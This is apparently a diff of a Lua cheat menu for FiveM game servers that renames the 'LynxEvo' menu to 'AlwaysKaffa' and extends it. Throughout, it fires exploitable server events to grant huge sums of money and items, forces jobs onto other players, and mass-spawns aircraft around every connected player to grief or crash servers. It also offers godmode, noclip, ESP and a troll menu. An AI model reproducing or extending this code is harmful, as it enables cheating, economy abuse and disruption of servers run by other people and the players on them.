                                 GetPlayerServerId(i),
-                                'Purposeless',
-                                'xaxaxaxaxaxaxaxaxax',
+                                '5391 was here',
+                                'AlwaysKaffa ~ 5391',
                                 43161337
                             )
                             TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(i), 'police', 3)
@@ -7119,7 +7278,10 @@ Citizen.CreateThread(
                         TriggerServerEvent('esx_gopostaljob:pay', 9999999999)
                         TriggerServerEvent('esx_banksecurity:pay', 9999999999)
                         TriggerServerEvent('esx_slotmachine:sv:2', 9999999999)
-                        for i = 0, 256 do
+                        TriggerServerEvent('esx-qalle-hunting:reward', 9999999999)
+                        TriggerServerEvent('esx-qalle-hunting:sell')
+
+                        for i = 0, 128 do
                             TriggerServerEvent(
                                 'esx:giveInventoryItem',
                                 GetPlayerServerId(i),
@@ -7167,19 +7329,19 @@ Citizen.CreateThread(
                             Citizen.Wait(0)
                             RequestModel(GetHashKey(dn))
                         end
-                        for bD = 0, 9 do
+                        --[[for bD = 0, 9 do
                             TriggerServerEvent(
                                 '_chat:messageEntered',
-                                'xaxaxaxaxaxaxaxaxax',
+                                '^1A^2l^3p^4h^5a^6V^7e^1t^2a',
                                 {
                                     141,
                                     211,
                                     255
                                 },
-                                '^' .. bD .. 'xaxaxaxaxaxaxaxaxax'
+                                '^' .. bD .. 'AlwaysKaffa ~ 5391'
                             )
-                        end
-                        for i = 0, 256 do
+                        end--]]
+                        for i = 0, 128 do
                             local dl =
                                 CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                 CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
@@ -7210,6 +7372,7 @@ Citizen.CreateThread(
                         local dl = 'luxor'
                         local dm = 'maverick'
                         local dn = 'blimp2'
+                        local dze = 'bombushka'
                         while not HasModelLoaded(GetHashKey(dk)) do
                             Citizen.Wait(0)
                             RequestModel(GetHashKey(dk))
@@ -7230,7 +7393,11 @@ Citizen.CreateThread(
                             Citizen.Wait(0)
                             RequestModel(GetHashKey(dn))
                         end
-                        for i = 0, 256 do
+                        while not HasModelLoaded(GetHashKey(dze)) do
+                            Citizen.Wait(0)
+                            RequestModel(GetHashKey(dze))
+                        end
+                        for i = 0, 128 do
                             for ak = 100, 150 do
                                 local dl =
                                     CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
@@ -7246,7 +7413,10 @@ Citizen.CreateThread(
                                     CreateVehicle(GetHashKey(dm), 2 * GetEntityCoords(GetPlayerPed(i)) + ak, true, true) and
                                     CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                     CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
-                                    CreateVehicle(GetHashKey(dn), 2 * GetEntityCoords(GetPlayerPed(i)) + ak, true, true)
+                                    CreateVehicle(GetHashKey(dn), 2 * GetEntityCoords(GetPlayerPed(i)) + ak, true, true) and
+                                    CreateVehicle(GetHashKey(dze), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
+                                    CreateVehicle(GetHashKey(dze), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
+                                    CreateVehicle(GetHashKey(dze), 2 * GetEntityCoords(GetPlayerPed(i)) + ak, true, true)
                             end
                         end
                     end
@@ -7376,70 +7546,71 @@ Citizen.CreateThread(
             512.0,
             9999.0
         }
-        LynxEvo.CreateMenu('xAriess', bs)
-        LynxEvo.SetSubTitle('xAriess', 'Ariesowe Spoleczenstwo')
-        LynxEvo.CreateSubMenu('SelfMenu', 'xAriess', 'Opcje SingePlayer')
-        LynxEvo.CreateSubMenu('TeleportMenu', 'xAriess', 'Menu Teleportacji')
-        LynxEvo.CreateSubMenu('WeaponMenu', 'xAriess', 'Menu Broni')
-        LynxEvo.CreateSubMenu('AdvM', 'xAriess', 'Opcje Zaawansowane')
-        LynxEvo.CreateSubMenu('LuaMenu', 'xAriess', 'Lua Menu')
-        LynxEvo.CreateSubMenu('VehicleMenu', 'xAriess', 'Menu Pojazdow')
-        LynxEvo.CreateSubMenu('OnlinePlayerMenu', 'xAriess', 'Gracze online')
-        LynxEvo.CreateSubMenu('PlayerOptionsMenu', 'OnlinePlayerMenu', 'Player Options')
-        LynxEvo.CreateSubMenu('Destroyer', 'AdvM', 'Destroyer Menu')
-        LynxEvo.CreateSubMenu('ESXBoss', 'LuaMenu', 'ESX Boss Triggers')
-        LynxEvo.CreateSubMenu('ESXMoney', 'LuaMenu', 'ESX Money Triggers')
-        LynxEvo.CreateSubMenu('ESXDrugs', 'LuaMenu', 'ESX Drugs')
-        LynxEvo.CreateSubMenu('ESXCustom', 'LuaMenu', 'ESX Random Triggers')
-        LynxEvo.CreateSubMenu('VRPTriggers', 'LuaMenu', 'VRP Triggers')
-        LynxEvo.CreateSubMenu('MiscTriggers', 'LuaMenu', 'Misc Triggers')
-        LynxEvo.CreateSubMenu('crds', 'xAriess', 'Credits')
-        LynxEvo.CreateSubMenu('ESXJobs', 'LuaMenu', 'ESX Jobs')
-        LynxEvo.CreateSubMenu('ESXJobs2', 'PlayerOptionsMenu', 'ESX Jobs Individual')
-        LynxEvo.CreateSubMenu('ESXTriggerini', 'PlayerOptionsMenu', 'ESX Triggers')
-        LynxEvo.CreateSubMenu('Trollmenu', 'PlayerOptionsMenu', 'Troll Menu')
-        LynxEvo.CreateSubMenu('WeaponTypes', 'WeaponMenu', 'Weapons')
-        LynxEvo.CreateSubMenu('WeaponTypeSelection', 'WeaponTypes', 'Weapon')
-        LynxEvo.CreateSubMenu('WeaponOptions', 'WeaponTypeSelection', 'Weapon Options')
-        LynxEvo.CreateSubMenu('ModSelect', 'WeaponOptions', 'Weapon Mod Options')
-        LynxEvo.CreateSubMenu('CarTypes', 'VehicleMenu', 'Vehicles')
-        LynxEvo.CreateSubMenu('CarTypeSelection', 'CarTypes', 'Moew :3')
-        LynxEvo.CreateSubMenu('CarOptions', 'CarTypeSelection', 'Car Options')
-        LynxEvo.CreateSubMenu('MainTrailer', 'VehicleMenu', 'Trailers to Attach')
-        LynxEvo.CreateSubMenu('MainTrailerSel', 'MainTrailer', 'Trailers Available')
-        LynxEvo.CreateSubMenu('MainTrailerSpa', 'MainTrailerSel', 'Trailer Options')
-        LynxEvo.CreateSubMenu('GiveSingleWeaponPlayer', 'OnlinePlayerMenu', 'Single Weapon Menu')
-        LynxEvo.CreateSubMenu('ESPMenu', 'AdvM', 'ESP Menu')
-        LynxEvo.CreateSubMenu('LSC', 'VehicleMenu', 'LSC Customs')
-        LynxEvo.CreateSubMenu('tunings', 'LSC', 'Visual Tuning')
-        LynxEvo.CreateSubMenu('performance', 'LSC', 'Performance Tuning')
-        LynxEvo.CreateSubMenu('VRPPlayerTriggers', 'PlayerOptionsMenu', 'VRP Triggers')
-        LynxEvo.CreateSubMenu('BoostMenu', 'VehicleMenu', 'Vehicle Boost')
-        LynxEvo.CreateSubMenu('SpawnPeds', 'Trollmenu', 'Spawn Peds')
-        LynxEvo.CreateSubMenu('GCT', 'VehicleMenu', 'Global Car Trolls')
-        LynxEvo.CreateSubMenu('CsMenu', 'AdvM', 'Crosshairs')
+        AlwaysKaffa.CreateMenu('AlwaysKaffa', '~u~Always~s~Kaffa')
+        AlwaysKaffa.SetSubTitle('AlwaysKaffa', 'Nertigel Gae')
+        AlwaysKaffa.CreateSubMenu('SelfMenu', 'AlwaysKaffa', 'Self Menu')
+        AlwaysKaffa.CreateSubMenu('TeleportMenu', 'AlwaysKaffa', 'Teleport Menu')
+        AlwaysKaffa.CreateSubMenu('WeaponMenu', 'AlwaysKaffa', 'Weapon Menu')
+        AlwaysKaffa.CreateSubMenu('AdvM', 'AlwaysKaffa', 'Advanced Menu')
+        AlwaysKaffa.CreateSubMenu('LuaMenu', 'AlwaysKaffa', 'Lua Menu')
+        AlwaysKaffa.CreateSubMenu('VehicleMenu', 'AlwaysKaffa', 'Vehicle Menu')
+        AlwaysKaffa.CreateSubMenu('OnlinePlayerMenu', 'AlwaysKaffa', 'Online Player Menu')
+        AlwaysKaffa.CreateSubMenu('ESXTriggersSelf', 'SelfMenu', 'ESX Triggers Self')
+        AlwaysKaffa.CreateSubMenu('PlayerOptionsMenu', 'OnlinePlayerMenu', 'Player Options')
+        AlwaysKaffa.CreateSubMenu('Destroyer', 'AdvM', 'Destroyer Menu')
+        AlwaysKaffa.CreateSubMenu('ESXBoss', 'LuaMenu', 'ESX Boss Triggers')
+        AlwaysKaffa.CreateSubMenu('ESXMoney', 'LuaMenu', 'ESX Money Triggers')
+        AlwaysKaffa.CreateSubMenu('ESXItems', 'LuaMenu', 'ESX Items')
+        AlwaysKaffa.CreateSubMenu('ESXCustom', 'LuaMenu', 'ESX Random Triggers')
+        AlwaysKaffa.CreateSubMenu('VRPTriggers', 'LuaMenu', 'VRP Triggers')
+        AlwaysKaffa.CreateSubMenu('MiscTriggers', 'LuaMenu', 'Misc Triggers')
+        AlwaysKaffa.CreateSubMenu('crds', 'AlwaysKaffa', 'Credits')
+        AlwaysKaffa.CreateSubMenu('ESXJobs', 'LuaMenu', 'ESX Jobs')
+        AlwaysKaffa.CreateSubMenu('ESXJobs2', 'PlayerOptionsMenu', 'ESX Jobs Individual')
+        AlwaysKaffa.CreateSubMenu('ESXTriggerini', 'PlayerOptionsMenu', 'ESX Triggers')
+        AlwaysKaffa.CreateSubMenu('Trollmenu', 'PlayerOptionsMenu', 'Troll Menu')
+        AlwaysKaffa.CreateSubMenu('WeaponTypes', 'WeaponMenu', 'Weapons')
+        AlwaysKaffa.CreateSubMenu('WeaponTypeSelection', 'WeaponTypes', 'Weapon')
+        AlwaysKaffa.CreateSubMenu('WeaponOptions', 'WeaponTypeSelection', 'Weapon Options')
+        AlwaysKaffa.CreateSubMenu('ModSelect', 'WeaponOptions', 'Weapon Mod Options')
+        AlwaysKaffa.CreateSubMenu('CarTypes', 'VehicleMenu', 'Vehicles')
+        AlwaysKaffa.CreateSubMenu('CarTypeSelection', 'CarTypes', 'Moew :3')
+        AlwaysKaffa.CreateSubMenu('CarOptions', 'CarTypeSelection', 'Car Options')
+        AlwaysKaffa.CreateSubMenu('MainTrailer', 'VehicleMenu', 'Trailers to Attach')
+        AlwaysKaffa.CreateSubMenu('MainTrailerSel', 'MainTrailer', 'Trailers Available')
+        AlwaysKaffa.CreateSubMenu('MainTrailerSpa', 'MainTrailerSel', 'Trailer Options')
+        AlwaysKaffa.CreateSubMenu('GiveSingleWeaponPlayer', 'OnlinePlayerMenu', 'Single Weapon Menu')
+        AlwaysKaffa.CreateSubMenu('ESPMenu', 'AdvM', 'ESP Menu')
+        AlwaysKaffa.CreateSubMenu('LSC', 'VehicleMenu', 'LSC Customs')
+        AlwaysKaffa.CreateSubMenu('tunings', 'LSC', 'Visual Tuning')
+        AlwaysKaffa.CreateSubMenu('performance', 'LSC', 'Performance Tuning')
+        AlwaysKaffa.CreateSubMenu('VRPPlayerTriggers', 'PlayerOptionsMenu', 'VRP Triggers')
+        AlwaysKaffa.CreateSubMenu('BoostMenu', 'VehicleMenu', 'Vehicle Boost')
+        AlwaysKaffa.CreateSubMenu('SpawnPeds', 'Trollmenu', 'Spawn Peds')
+        AlwaysKaffa.CreateSubMenu('GCT', 'VehicleMenu', 'Global Car Trolls')
+        AlwaysKaffa.CreateSubMenu('CsMenu', 'AdvM', 'Crosshairs')
         for i, dE in pairs(bl) do
-            LynxEvo.CreateSubMenu(dE.id, 'tunings', dE.name)
+            AlwaysKaffa.CreateSubMenu(dE.id, 'tunings', dE.name)
             if dE.id == 'paint' then
-                LynxEvo.CreateSubMenu('primary', dE.id, 'Primary Paint')
-                LynxEvo.CreateSubMenu('secondary', dE.id, 'Secondary Paint')
-                LynxEvo.CreateSubMenu('rimpaint', dE.id, 'Wheel Paint')
-                LynxEvo.CreateSubMenu('classic1', 'primary', 'Classic Paint')
-                LynxEvo.CreateSubMenu('metallic1', 'primary', 'Metallic Paint')
-                LynxEvo.CreateSubMenu('matte1', 'primary', 'Matte Paint')
-                LynxEvo.CreateSubMenu('metal1', 'primary', 'Metal Paint')
-                LynxEvo.CreateSubMenu('classic2', 'secondary', 'Classic Paint')
-                LynxEvo.CreateSubMenu('metallic2', 'secondary', 'Metallic Paint')
-                LynxEvo.CreateSubMenu('matte2', 'secondary', 'Matte Paint')
-                LynxEvo.CreateSubMenu('metal2', 'secondary', 'Metal Paint')
-                LynxEvo.CreateSubMenu('classic3', 'rimpaint', 'Classic Paint')
-                LynxEvo.CreateSubMenu('metallic3', 'rimpaint', 'Metallic Paint')
-                LynxEvo.CreateSubMenu('matte3', 'rimpaint', 'Matte Paint')
-                LynxEvo.CreateSubMenu('metal3', 'rimpaint', 'Metal Paint')
+                AlwaysKaffa.CreateSubMenu('primary', dE.id, 'Primary Paint')
+                AlwaysKaffa.CreateSubMenu('secondary', dE.id, 'Secondary Paint')
+                AlwaysKaffa.CreateSubMenu('rimpaint', dE.id, 'Wheel Paint')
+                AlwaysKaffa.CreateSubMenu('classic1', 'primary', 'Classic Paint')
+                AlwaysKaffa.CreateSubMenu('metallic1', 'primary', 'Metallic Paint')
+                AlwaysKaffa.CreateSubMenu('matte1', 'primary', 'Matte Paint')
+                AlwaysKaffa.CreateSubMenu('metal1', 'primary', 'Metal Paint')
+                AlwaysKaffa.CreateSubMenu('classic2', 'secondary', 'Classic Paint')
+                AlwaysKaffa.CreateSubMenu('metallic2', 'secondary', 'Metallic Paint')
+                AlwaysKaffa.CreateSubMenu('matte2', 'secondary', 'Matte Paint')
+                AlwaysKaffa.CreateSubMenu('metal2', 'secondary', 'Metal Paint')
+                AlwaysKaffa.CreateSubMenu('classic3', 'rimpaint', 'Classic Paint')
+                AlwaysKaffa.CreateSubMenu('metallic3', 'rimpaint', 'Metallic Paint')
+                AlwaysKaffa.CreateSubMenu('matte3', 'rimpaint', 'Matte Paint')
+                AlwaysKaffa.CreateSubMenu('metal3', 'rimpaint', 'Metal Paint')
             end
         end
         for i, dE in pairs(bm) do
-            LynxEvo.CreateSubMenu(dE.id, 'performance', dE.name)
+            AlwaysKaffa.CreateSubMenu(dE.id, 'performance', dE.name)
         end
         local SelectedPlayer
         while bw do
@@ -7447,7 +7618,7 @@ Citizen.CreateThread(
             veh = GetVehiclePedIsUsing(ped)
             SetVehicleModKit(veh, 0)
             for i, dE in pairs(bl) do
-                if LynxEvo.IsMenuOpened('tunings') then
+                if AlwaysKaffa.IsMenuOpened('tunings') then
                     if bg then
                         if bi == 'neon' then
                             local r, g, b = table.unpack(bh)
@@ -7481,24 +7652,24 @@ Citizen.CreateThread(
                         end
                     end
                 end
-                if LynxEvo.IsMenuOpened(dE.id) then
+                if AlwaysKaffa.IsMenuOpened(dE.id) then
                     if dE.id == 'wheeltypes' then
-                        if LynxEvo.Button('Sport Wheels') then
+                        if AlwaysKaffa.Button('Sport Wheels') then
                             SetVehicleWheelType(veh, 0)
-                        elseif LynxEvo.Button('Muscle Wheels') then
+                        elseif AlwaysKaffa.Button('Muscle Wheels') then
                             SetVehicleWheelType(veh, 1)
-                        elseif LynxEvo.Button('Lowrider Wheels') then
+                        elseif AlwaysKaffa.Button('Lowrider Wheels') then
                             SetVehicleWheelType(veh, 2)
-                        elseif LynxEvo.Button('SUV Wheels') then
+                        elseif AlwaysKaffa.Button('SUV Wheels') then
                             SetVehicleWheelType(veh, 3)
-                        elseif LynxEvo.Button('Offroad Wheels') then
+                        elseif AlwaysKaffa.Button('Offroad Wheels') then
                             SetVehicleWheelType(veh, 4)
-                        elseif LynxEvo.Button('Tuner Wheels') then
+                        elseif AlwaysKaffa.Button('Tuner Wheels') then
                             SetVehicleWheelType(veh, 5)
-                        elseif LynxEvo.Button('High End Wheels') then
+                        elseif AlwaysKaffa.Button('High End Wheels') then
                             SetVehicleWheelType(veh, 7)
                         end
-                        LynxEvo.Display()
+                        AlwaysKaffa.Display()
                     elseif dE.id == 'extra' then
                         local dJ = checkValidVehicleExtras()
                         for i, dE in pairs(dJ) do
@@ -7507,13 +7678,13 @@ Citizen.CreateThread(
                             else
                                 pricestring = 'Not Installed'
                             end
-                            if LynxEvo.Button(dE.menuName, pricestring) then
+                            if AlwaysKaffa.Button(dE.menuName, pricestring) then
                                 SetVehicleExtra(veh, i, IsVehicleExtraTurnedOn(veh, i))
                             end
                         end
-                        LynxEvo.Display()
+                        AlwaysKaffa.Display()
                     elseif dE.id == 'headlight' then
-                        if LynxEvo.Button('None') then
+                        if AlwaysKaffa.Button('None') then
                             SetVehicleHeadlightsColour(veh, -1)
                         end
                         for dK, dE in pairs(bo) do
@@ -7528,7 +7699,7 @@ Citizen.CreateThread(
                                 end
                             end
                             head = GetVehicleHeadlightsColour(veh)
-                            if LynxEvo.Button(dE.name, pricetext) then
+                            if AlwaysKaffa.Button(dE.name, pricetext) then
                                 if not bg then
                                     bi = 'headlight'
                                     bk = false
@@ -7548,9 +7719,9 @@ Citizen.CreateThread(
                                 end
                             end
                         end
-                        LynxEvo.Display()
+                        AlwaysKaffa.Display()
                     elseif dE.id == 'licence' then
-                        if LynxEvo.Button('None') then
+                        if AlwaysKaffa.Button('None') then
                             SetVehicleNumberPlateTextIndex(veh, 3)
                         end
                         for dK, dE in pairs(bn) do
@@ -7565,7 +7736,7 @@ Citizen.CreateThread(
                                 end
                             end
                             plate = GetVehicleNumberPlateTextIndex(veh)
-                            if LynxEvo.Button(dE.name, pricetext) then
+                            if AlwaysKaffa.Button(dE.name, pricetext) then
                                 if not bg then
                                     bi = 'headlight'
                                     bk = false
@@ -7584,9 +7755,9 @@ Citizen.CreateThread(
                                 end
                             end
                         end
-                        LynxEvo.Display()
+                        AlwaysKaffa.Display()
                     elseif dE.id == 'neon' then
-                        if LynxEvo.Button('None') then
+                        if AlwaysKaffa.Button('None') then
                             SetVehicleNeonLightsColour(veh, 255, 255, 255)
                             SetVehicleNeonLightEnabled(veh, 0, false)
                             SetVehicleNeonLightEnabled(veh, 1, false)
@@ -7608,7 +7779,7 @@ Citizen.CreateThread(
                                     pricestring = 'Not Installed'
                                 end
                             end
-                            if LynxEvo.Button(i, pricestring) then
+                            if AlwaysKaffa.Button(i, pricestring) then
                                 if not bg then
                                     bi = 'neon'
                                     bk = IsVehicleNeonLightEnabled(veh, 1)
@@ -7639,13 +7810,13 @@ Citizen.CreateThread(
                                 end
                             end
                         end
-                        LynxEvo.Display()
+                        AlwaysKaffa.Display()
                     elseif dE.id == 'paint' then
-                        if LynxEvo.MenuButton('~h~~p~#~s~ Primary Paint', 'primary') then
-                        elseif LynxEvo.MenuButton('~h~~p~#~s~ Secondary Paint', 'secondary') then
-                        elseif LynxEvo.MenuButton('~h~~p~#~s~ Wheel Paint', 'rimpaint') then
+                        if AlwaysKaffa.MenuButton('~h~~p~»~s~ Primary Paint', 'primary') then
+                        elseif AlwaysKaffa.MenuButton('~h~~p~»~s~ Secondary Paint', 'secondary') then
+                        elseif AlwaysKaffa.MenuButton('~h~~p~»~s~ Wheel Paint', 'rimpaint') then
                         end
-                        LynxEvo.Display()
+                        AlwaysKaffa.Display()
                     else
                         local az = checkValidVehicleMods(dE.id)
                         for i, dL in pairs(az) do
@@ -7670,7 +7841,7 @@ Citizen.CreateThread(
                             if dL.menuName == 'NULL' then
                                 dL.menuName = 'unknown'
                             end
-                            if LynxEvo.Button(dL.menuName) then
+                            if AlwaysKaffa.Button(dL.menuName) then
                                 if not bg then
                                     bi = dE.id
                                     bh = GetVehicleMod(veh, dE.id)
@@ -7710,12 +7881,12 @@ Citizen.CreateThread(
                                 end
                             end
                         end
-                        LynxEvo.Display()
+                        AlwaysKaffa.Display()
                     end
                 end
             end
             for i, dE in pairs(bm) do
-                if LynxEvo.IsMenuOpened(dE.id) then
+                if AlwaysKaffa.IsMenuOpened(dE.id) then
                     if GetVehicleMod(veh, dE.id) == 0 then
                         pricestock = 'Not Installed'
                         price1 = 'Installed'
@@ -7747,38 +7918,42 @@ Citizen.CreateThread(
                         price3 = 'Not Installed'
                         price4 = 'Not Installed'
                     end
-                    if LynxEvo.Button('Stock ' .. dE.name, pricestock) then
+                    if AlwaysKaffa.Button('Stock ' .. dE.name, pricestock) then
                         SetVehicleMod(veh, dE.id, -1)
-                    elseif LynxEvo.Button(dE.name .. ' Upgrade 1', price1) then
+                    elseif AlwaysKaffa.Button(dE.name .. ' Upgrade 1', price1) then
                         SetVehicleMod(veh, dE.id, 0)
-                    elseif LynxEvo.Button(dE.name .. ' Upgrade 2', price2) then
+                    elseif AlwaysKaffa.Button(dE.name .. ' Upgrade 2', price2) then
                         SetVehicleMod(veh, dE.id, 1)
-                    elseif LynxEvo.Button(dE.name .. ' Upgrade 3', price3) then
+                    elseif AlwaysKaffa.Button(dE.name .. ' Upgrade 3', price3) then
                         SetVehicleMod(veh, dE.id, 2)
-                    elseif dE.id ~= 13 and dE.id ~= 12 and LynxEvo.Button(dE.name .. ' Upgrade 4', price4) then
+                    elseif dE.id ~= 13 and dE.id ~= 12 and AlwaysKaffa.Button(dE.name .. ' Upgrade 4', price4) then
                         SetVehicleMod(veh, dE.id, 3)
                     end
-                    LynxEvo.Display()
+                    AlwaysKaffa.Display()
                 end
             end
-            if LynxEvo.IsMenuOpened('xAriess') then
+            if AlwaysKaffa.IsMenuOpened('AlwaysKaffa') then
                 local dQ = PlayerId(-1)
                 local bH = GetPlayerName(dQ)
-                av('YEBAC FIVEMA', false)
-                av('KOCHAM CIE', false)
-                if LynxEvo.MenuButton('~h~~p~#~s~ Self Menu', 'SelfMenu') then
-                elseif LynxEvo.MenuButton('~h~~p~#~s~ Online Players', 'OnlinePlayerMenu') then
-                elseif LynxEvo.MenuButton('~h~~p~#~s~ Teleport Menu', 'TeleportMenu') then
-                elseif LynxEvo.MenuButton('~h~~p~#~s~ Vehicle Menu', 'VehicleMenu') then
-                elseif LynxEvo.MenuButton('~h~~p~#~s~ Weapon Menu', 'WeaponMenu') then
-                elseif LynxEvo.MenuButton('~h~~p~#~s~ Lua Menu ~o~~h~:3', 'LuaMenu') then
-                elseif LynxEvo.MenuButton('~h~~p~#~s~ Advanced Mode ~o~~h~xD', 'AdvM') then
-                elseif LynxEvo.MenuButton('~h~~p~# ~y~https://ig.xaries.pl', 'crds') then
+                --av('AlwaysKaffa(eta)', true)
+                if AlwaysKaffa.MenuButton('~h~~p~»~s~ Self Menu', 'SelfMenu') then
+                elseif AlwaysKaffa.MenuButton('~h~~p~»~s~ Online Players', 'OnlinePlayerMenu') then
+                elseif AlwaysKaffa.MenuButton('~h~~p~»~s~ Teleport Menu', 'TeleportMenu') then
+                elseif AlwaysKaffa.MenuButton('~h~~p~»~s~ Vehicle Menu', 'VehicleMenu') then
+                elseif AlwaysKaffa.MenuButton('~h~~p~»~s~ Weapon Menu', 'WeaponMenu') then
+                elseif AlwaysKaffa.MenuButton('~h~~p~»~s~ Lua Menu', 'LuaMenu') then -- ~o~~h~:3
+                elseif AlwaysKaffa.MenuButton('~h~~p~»~s~ Advanced Mode', 'AdvM') then -- ~o~~h~xD
+                elseif AlwaysKaffa.MenuButton('~h~~p~» ~y~Credits', 'crds') then
+                elseif AlwaysKaffa.Button('~h~~p~» ~r~Disconnect') then
+                    H4tuf5 = false
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('SelfMenu') then
-                if
-                    LynxEvo.CheckBox(
+                if H4tuf5 then
+                    AlwaysKaffa.Display()
+                end
+            elseif AlwaysKaffa.IsMenuOpened('SelfMenu') then
+                if AlwaysKaffa.MenuButton('~h~~p~»~s~ ESX Triggers', 'ESXTriggersSelf') then
+                elseif
+                    AlwaysKaffa.CheckBox(
                         '~h~~g~Godmode',
                         Godmode,
                         function(dR)
@@ -7786,7 +7961,7 @@ Citizen.CreateThread(
                         end
                     )
                  then
-                elseif LynxEvo.Button('~h~~y~Semi ~g~Godmode') then
+                elseif AlwaysKaffa.Button('~h~~y~Semi ~g~Godmode') then
                     local dS = 'stt_prop_stunt_soccer_ball'
                     while not HasModelLoaded(GetHashKey(dS)) do
                         Citizen.Wait(0)
@@ -7812,7 +7987,7 @@ Citizen.CreateThread(
                         true
                     )
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~~g~Player Visible',
                         d4,
                         function(dR)
@@ -7820,16 +7995,14 @@ Citizen.CreateThread(
                         end
                     )
                  then
-                elseif LynxEvo.Button('~h~~r~Suicide') then
+                elseif AlwaysKaffa.Button('~h~~r~Suicide') then
                     SetEntityHealth(PlayerPedId(-1), 0)
-                elseif LynxEvo.Button('~h~~g~ESX~s~ Revive Yourself~s~') then
-                    TriggerEvent('esx_ambulancejob:revive')
-                elseif LynxEvo.Button('~h~~g~Heal/Revive') then
+                elseif AlwaysKaffa.Button("~h~~g~Heal") then
                     SetEntityHealth(PlayerPedId(-1), 200)
-                elseif LynxEvo.Button('~h~~b~Give Armour') then
+                elseif AlwaysKaffa.Button("~h~~b~Armour") then
                     SetPedArmour(PlayerPedId(-1), 200)
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~Infinite Stamina',
                         InfStamina,
                         function(dR)
@@ -7838,7 +8011,7 @@ Citizen.CreateThread(
                     )
                  then
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~Thermal ~o~Vision',
                         bTherm,
                         function(bTherm)
@@ -7849,7 +8022,7 @@ Citizen.CreateThread(
                     bTherm = therm
                     SetSeethrough(therm)
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~Fast Run',
                         fastrun,
                         function(dR)
@@ -7858,7 +8031,7 @@ Citizen.CreateThread(
                     )
                  then
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~Super Jump',
                         SuperJump,
                         function(dR)
@@ -7867,7 +8040,7 @@ Citizen.CreateThread(
                     )
                  then
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~Noclip',
                         Noclip,
                         function(dR)
@@ -7876,36 +8049,31 @@ Citizen.CreateThread(
                     )
                  then
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('OnlinePlayerMenu') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('OnlinePlayerMenu') then
                 for i = 0, 128 do
                     if
                         NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and
-                            LynxEvo.MenuButton(
-                                GetPlayerName(i) ..
-                                    ' ~p~[' ..
-                                        GetPlayerServerId(i) ..
-                                            ']~s~ ~y~[' ..
-                                                i ..
-                                                    ']~s~ ' ..
-                                                        (IsPedDeadOrDying(GetPlayerPed(i), 1) and '~h~~r~DEAD' or
-                                                            '~h~~g~ALIVE'),
+                            AlwaysKaffa.MenuButton(
+                                '~p~» ~s~' .. GetPlayerName(i) .. ' ~p~[' .. GetPlayerServerId(i) .. ']~s~ ~y~[' ..
+                                i .. ']~s~ ' .. (IsPedDeadOrDying(GetPlayerPed(i), 1) and '~h~~r~DEAD' or
+                                '~h~~g~ALIVE'),
                                 'PlayerOptionsMenu'
                             )
                      then
                         SelectedPlayer = i
                     end
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('PlayerOptionsMenu') then
-                LynxEvo.SetSubTitle('PlayerOptionsMenu', 'Player Options [' .. GetPlayerName(SelectedPlayer) .. ']')
-                if LynxEvo.MenuButton('~h~~p~#~s~ ESX Triggers', 'ESXTriggerini') then
-                elseif LynxEvo.MenuButton('~h~~p~#~s~ ESX Jobs', 'ESXJobs2') then
-                elseif LynxEvo.MenuButton('~h~~p~#~s~ VRP Triggers', 'VRPPlayerTriggers') then
-                elseif LynxEvo.MenuButton('~h~~p~#~s~ Troll Menu', 'Trollmenu') then
-                elseif LynxEvo.Button('~h~Spectate', cC and '~g~[SPECTATING]') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('PlayerOptionsMenu') then
+                AlwaysKaffa.SetSubTitle('PlayerOptionsMenu', 'Player Options [' .. GetPlayerName(SelectedPlayer) .. ']')
+                if AlwaysKaffa.MenuButton('~h~~p~»~s~ ESX Triggers', 'ESXTriggerini') then
+                elseif AlwaysKaffa.MenuButton('~h~~p~»~s~ ESX Jobs', 'ESXJobs2') then
+                elseif AlwaysKaffa.MenuButton('~h~~p~»~s~ VRP Triggers', 'VRPPlayerTriggers') then
+                elseif AlwaysKaffa.MenuButton('~h~~p~»~s~ Troll Menu', 'Trollmenu') then
+                elseif AlwaysKaffa.Button('~h~Spectate', cC and '~g~[SPECTATING]') then
                     SpectatePlayer(SelectedPlayer)
-                elseif LynxEvo.Button('~h~~r~Semi GOD ~s~Player') then
+                elseif AlwaysKaffa.Button('~h~~r~Semi GOD ~s~Player') then
                     local dS = 'stt_prop_stunt_soccer_ball'
                     while not HasModelLoaded(GetHashKey(dS)) do
                         Citizen.Wait(0)
@@ -7930,19 +8098,19 @@ Citizen.CreateThread(
                         1,
                         true
                     )
-                elseif LynxEvo.Button('~h~~g~Heal ~s~Player') then
+                elseif AlwaysKaffa.Button('~h~~g~Heal ~s~Player') then
                     local dU = 'PICKUP_HEALTH_STANDARD'
                     local dV = GetHashKey(dU)
                     local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                     CreateAmbientPickup(dV, bK.x, bK.y, bK.z + 1.0, 1, 1, dV, 1, 0)
                     SetPickupRegenerationTime(pickup, 60)
-                elseif LynxEvo.Button('~h~~b~Armour ~s~Player') then
+                elseif AlwaysKaffa.Button('~h~~b~Armour ~s~Player') then
